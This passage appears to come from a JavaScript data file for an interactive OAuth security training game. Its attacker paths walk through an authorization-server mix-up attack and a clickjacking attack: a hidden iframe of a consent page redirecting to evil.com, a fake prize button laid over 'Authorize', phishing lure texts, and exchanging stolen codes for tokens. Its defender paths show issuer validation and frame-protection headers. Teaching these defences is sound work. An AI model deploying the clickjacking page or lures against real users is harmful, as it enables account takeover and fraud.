7. App thinks code is for evil-idp
8. App sends code to YOUR IdP!`,
          observation: "The client will send the corporate code to your IdP!",
          choices: [
            { id: 'execute', text: 'Execute the attack', riskDelta: 25, successDelta: 25, next: 'execute_attack' }
          ]
        },

        execute_attack: {
          id: 'execute_attack',
          title: 'Executing the Attack',
          narrative: "You lure a victim to initiate login with your IdP:",
          codeSnippet: `Attack execution:
1. Victim clicks link to login via your IdP
2. Your IdP secretly redirects to corporate IdP
3. Victim sees corporate login (looks normal!)
4. Victim enters corporate credentials
5. Corporate IdP issues code
6. Code arrives at /callback
7. App sends code to YOUR token endpoint!

You receive: code=CORP_ABC123`,
          configCheck: 'validateIssuer',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The app validates the issuer in the response:",
            codeSnippet: `// App checks response:
Response iss: corporate-idp.company.com
Expected iss: evil-idp.attacker.com

MISMATCH DETECTED!
Error: Issuer does not match expected IdP

The code is discarded.`,
            explanation: "The app uses RFC 9207 issuer validation! It checks that the authorization response's 'iss' parameter matches the IdP it expects. Your mix-up attack fails because the response clearly came from the corporate IdP, not yours.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Code Intercepted!',
            narrative: "The app sends the corporate code to your IdP:",
            codeSnippet: `// Your evil token endpoint receives:
POST /token
grant_type=authorization_code
&code=CORP_ABC123  <- Corporate user's code!
&redirect_uri=https://app.example.com/callback

You now have a valid authorization code
for the corporate IdP!`,
            next: 'exchange_code'
          }
        },

        exchange_code: {
          id: 'exchange_code',
          title: 'Exchanging the Stolen Code',
          narrative: "You exchange the code at the real corporate IdP:",
          codeSnippet: `POST https://corporate-idp.company.com/token
grant_type=authorization_code
&code=CORP_ABC123
&client_id=app-client-id
&redirect_uri=https://app.example.com/callback

Response:
{
  "access_token": "corporate_user_token",
  "id_token": "eyJ...",
  "refresh_token": "ref_xyz"
}`,
          observation: "You now have tokens for a corporate user!",
          explanation: "The AS mix-up attack succeeded! You tricked the client into sending a corporate authorization code to your malicious IdP. You then exchanged it at the real corporate IdP to get valid tokens.",
          endingType: 'success'
        }
      }
    },

    defender: {
      intro: "A security researcher demonstrated that your multi-IdP SSO implementation is vulnerable to authorization server mix-up attacks. Attackers could steal codes from legitimate IdP sessions...",
      goal: "Implement issuer validation to prevent IdP confusion attacks.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Understanding the Vulnerability',
          narrative: "You review the AS mix-up attack mechanism:",
          codeSnippet: `The Mix-Up Attack:
1. Attacker IdP in your federation
2. Victim starts login with attacker IdP
3. Attacker redirects to legitimate IdP
4. Victim authenticates with legitimate IdP
5. Code comes back to your app
6. App sends code to attacker's token endpoint!

Result: Attacker gets legitimate user's code`,
          observation: "Your app can't distinguish which IdP the code came from!",
          showControls: ['validateIssuer'],
          choices: [
            { id: 'implement', text: 'Implement issuer validation', riskDelta: 0, successDelta: 30, next: 'implement_iss' },
            { id: 'research', text: 'Research RFC 9207', riskDelta: 0, successDelta: 15, next: 'research_rfc' }
          ]
        },

        research_rfc: {
          id: 'research_rfc',
          title: 'RFC 9207: Authorization Response Issuer',
          narrative: "You study the solution:",
          codeSnippet: `RFC 9207: OAuth 2.0 Authorization Server Issuer

The AS includes 'iss' in authorization response:
/callback?code=ABC&iss=https://idp.example.com

Client MUST verify:
1. 'iss' parameter is present
2. 'iss' matches expected authorization server
3. Reject if mismatch

This prevents mix-up attacks!`,
          choices: [
            { id: 'implement', text: 'Implement this now', riskDelta: 0, successDelta: 25, next: 'implement_iss' }
          ]
        },

        implement_iss: {
          id: 'implement_iss',
          title: 'Implementing Issuer Validation',
          narrative: "You add issuer validation to your callback handler:",
          instruction: "Enable 'Validate Issuer' to check the 'iss' parameter in authorization responses.",
          showControls: ['validateIssuer'],
          codeSnippet: `// Updated callback handler:
app.get('/callback', (req, res) => {
  const { code, iss, state } = req.query;

  // Get expected IdP from session
  const expectedIdp = req.session.expectedIdp;

  // RFC 9207: Validate issuer
  if (iss !== expectedIdp) {
    log.security('IdP mismatch', { expected: expectedIdp, got: iss });
    return res.status(400).send('Invalid issuer');
  }

  // Safe to exchange code with expectedIdp
  exchangeCode(code, expectedIdp);
});`,
          configCheck: 'validateIssuer',
          onSecure: {
            title: 'Issuer Validation Enabled',
            narrative: "Your app now validates the authorization response issuer:",
            codeSnippet: `Mix-up attack attempt:
Session expects: evil-idp.attacker.com
Response iss:    corporate-idp.company.com

Result: REJECTED
"Issuer mismatch - possible mix-up attack"

The code is safely discarded.`,
            explanation: "By validating the 'iss' parameter, you ensure codes are only exchanged with the IdP that actually issued them. Mix-up attacks are now impossible!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without issuer validation, mix-up attacks remain possible.",
            instruction: "Enable issuer validation to secure your multi-IdP implementation.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'invisible_consent',
    title: 'The Invisible Click',
    category: 'Authorization',
    difficulty: 'intermediate',
    estimatedTime: '8 min',
    description: 'Attackers use clickjacking to trick users into authorizing malicious applications.',

    vulnerableConfig: { frameProtection: false },
    secureConfig: { frameProtection: true },

    attacker: {
      intro: "You've created a malicious OAuth application but users won't authorize it knowingly. You notice the authorization server's consent page doesn't have frame protection...",
      goal: "Use clickjacking to trick users into authorizing your malicious application without their knowledge.",
      initialRisk: 20,
      initialSuccess: 40,

      steps: {
        start: {
          id: 'start',
          title: 'Testing Frame Protection',
          narrative: "You test if the authorization page can be embedded:",
          codeSnippet: `<iframe src="https://auth.example.com/authorize?
  client_id=your-malicious-app
  &redirect_uri=https://evil.com/callback
  &scope=read write delete"
  style="opacity: 0.01;">
</iframe>`,
          observation: "If this works, you can overlay a fake UI on top!",
          choices: [
            { id: 'test_frame', text: 'Test if framing is allowed', riskDelta: 10, successDelta: 15, next: 'frame_test' }
          ]
        },

        frame_test: {
          id: 'frame_test',
          title: 'Testing the Iframe',
          narrative: "You check the response headers:",
          codeSnippet: `HTTP Response Headers:
Content-Type: text/html
Cache-Control: no-store

// Missing:
// X-Frame-Options: DENY
// Content-Security-Policy: frame-ancestors 'none'`,
          configCheck: 'frameProtection',
          onSecure: {
            title: 'Framing Blocked!',
            narrative: "The browser refuses to load the page in an iframe:",
            codeSnippet: `Console Error:
Refused to display 'https://auth.example.com/...'
in a frame because it set 'X-Frame-Options' to 'deny'.`,
            explanation: "The authorization server sets X-Frame-Options: DENY or CSP frame-ancestors 'none'. Browsers won't render the page in any iframe, preventing clickjacking entirely.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Framing Allowed!',
            narrative: "The authorization page loads in your iframe!",
            codeSnippet: `No frame protection headers!
The consent page renders in your iframe.
Time to build the clickjacking attack.`,
            next: 'build_attack'
          }
        },

        build_attack: {
          id: 'build_attack',
          title: 'Building the Clickjacking Page',
          narrative: "You create a deceptive page with the consent form hidden behind a fake UI:",
          codeSnippet: `<style>
  .bait {
    position: absolute;
    z-index: 1;
  }
  .hidden-consent {
    position: absolute;
    z-index: 2;
    opacity: 0.0001; /* Nearly invisible */
  }
  #authorize-btn {
    /* Positioned exactly over "Claim Prize" */
    top: 340px;
    left: 250px;
  }
</style>

<div class="bait">
  <h1>Congratulations! You Won!</h1>
  <button style="top:340px;left:250px;">
    Claim Your Prize!
  </button>
</div>

<iframe class="hidden-consent"
  src="https://auth.example.com/authorize?...">
</iframe>`,
          observation: "The 'Authorize' button is positioned exactly behind 'Claim Prize'!",
          choices: [
            { id: 'deploy', text: 'Deploy the attack page', riskDelta: 15, successDelta: 20, next: 'deploy_attack' }
          ]
        },

        deploy_attack: {
          id: 'deploy_attack',
          title: 'Deploying the Attack',
          narrative: "You host the page and lure victims:",
          codeSnippet: `Your attack site: prize-winner.com

Email campaign:
"You've been selected for a $500 gift card!
Click here to claim: https://prize-winner.com"

Social media:
"Free iPhone giveaway! Click to enter!"`,
          choices: [
            { id: 'wait', text: 'Wait for victims to click', riskDelta: 20, successDelta: 25, next: 'victim_clicks' }
          ]
        },

        victim_clicks: {
          id: 'victim_clicks',
          title: 'Victim Interaction',
          narrative: "A victim visits your page, already logged into the target service:",
          codeSnippet: `Victim's experience:
1. Visits prize-winner.com
2. Sees "Claim Your Prize!" button
3. Clicks the button
4. (Actually clicks hidden "Authorize" button)
5. Gets redirected to your callback
6. Confused, closes the tab

Your experience:
Received OAuth grant for victim's account!`,
          configCheck: 'frameProtection',
          onSecure: {
            title: 'Attack Failed',
            narrative: "The attack couldn't work because the page can't be framed.",
            explanation: "Frame protection prevents the attack entirely.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Grant Captured!',
            narrative: "You receive an authorization code for the victim!",
            codeSnippet: `Your callback received:
?code=victim_auth_code_xyz

Exchange for tokens:
{
  "access_token": "victim_access_token",
  "scope": "read write delete"
}

You now have full access to victim's account!`,
            explanation: "Clickjacking allowed you to trick the user into authorizing your malicious app. They thought they were clicking 'Claim Prize' but actually clicked 'Authorize'. This is why frame protection is essential!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Security researchers demonstrated that your authorization consent page is vulnerable to clickjacking. Attackers can trick users into unknowingly authorizing malicious applications...",
      goal: "Implement frame protection to prevent clickjacking attacks on the consent page.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Understanding Clickjacking',
          narrative: "You learn how clickjacking works:",
          codeSnippet: `Clickjacking Attack:
┌─────────────────────────────┐
│  Fake Page (visible)        │
│  ┌───────────────────────┐  │
│  │  "Click to Win!"      │  │
│  │  [  Claim Prize  ]    │  │
│  └───────────────────────┘  │
│                             │
│  Hidden iframe (invisible)  │
│  ┌───────────────────────┐  │
│  │  Authorize App?       │  │
│  │  [  Authorize  ]  <- clicked!
│  └───────────────────────┘  │
└─────────────────────────────┘`,
          observation: "Users click on what they see, but their click goes to the hidden iframe!",
          showControls: ['frameProtection'],
          choices: [
            { id: 'implement', text: 'Implement frame protection', riskDelta: 0, successDelta: 30, next: 'implement_protection' },
            { id: 'options', text: 'Review protection options', riskDelta: 0, successDelta: 15, next: 'review_options' }
          ]
        },

        review_options: {
          id: 'review_options',
          title: 'Frame Protection Options',
          narrative: "You review the available protections:",
          codeSnippet: `Option 1: X-Frame-Options header
X-Frame-Options: DENY
- Blocks ALL framing
- Older but widely supported

Option 2: CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none'
- More flexible (can allow specific origins)
- Modern standard

Option 3: JavaScript frame-busting
if (top !== self) top.location = self.location;
- Can be bypassed (sandbox attribute)
- Use as fallback only

Recommendation: Use both headers!`,
          choices: [
            { id: 'implement', text: 'Implement header protection', riskDelta: 0, successDelta: 25, next: 'implement_protection' }
          ]
        },

        implement_protection: {
          id: 'implement_protection',
          title: 'Adding Frame Protection',
          narrative: "You add frame protection headers to authorization pages:",
          instruction: "Enable 'Frame Protection' to add X-Frame-Options and CSP headers.",
          showControls: ['frameProtection'],
          codeSnippet: `// Authorization endpoint middleware:
app.use('/authorize', (req, res, next) => {
  // Block framing entirely
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'none'"
  );
  next();
});

// Also add to consent confirmation page`,
          configCheck: 'frameProtection',
          onSecure: {
            title: 'Frame Protection Enabled',
            narrative: "Your authorization pages now block framing:",
            codeSnippet: `Response Headers:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

When attacker tries to iframe:
Browser: "Refused to display in frame"

Clickjacking attack: IMPOSSIBLE`,
            explanation: "Frame protection headers instruct browsers to never render your authorization pages inside iframes. Attackers cannot overlay fake UI because the page simply won't load in their iframe.",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without frame protection, clickjacking attacks remain possible.",
            instruction: "Enable frame protection to secure your authorization flow.",
            continueDisabled: true
          }
        }
      }
    }
  }
];

// Ending type definitions
const ENDING_TYPES = {
  success: { icon: '🏆', title: 'Complete Success', description: 'Attack succeeded - target compromised' },
  partial: { icon: '⚠️', title: 'Partial Success', description: 'Attack worked but triggered alerts' },
  blocked: { icon: '🔒', title: 'Blocked', description: 'Security controls prevented the attack' },
  detected: { icon: '🚨', title: 'Detected', description: 'Attack was caught - evidence left' }
};

// Helper functions
function getScenarioById(id) {
  return STORY_SCENARIOS.find(s => s.id === id);
}

function getDifficultyClass(difficulty) {
  const classes = { beginner: 'badge-success', intermediate: 'badge-warning', advanced: 'badge-error' };
  return classes[difficulty] || 'badge-info';
}

function getEndingInfo(type) {
  return ENDING_TYPES[type] || ENDING_TYPES.blocked;
}

// Export
if (typeof window !== 'undefined') {
  window.STORY_SCENARIOS = STORY_SCENARIOS;
  window.ENDING_TYPES = ENDING_TYPES;
  window.getScenarioById = getScenarioById;
  window.getDifficultyClass = getDifficultyClass;
  window.getEndingInfo = getEndingInfo;
}
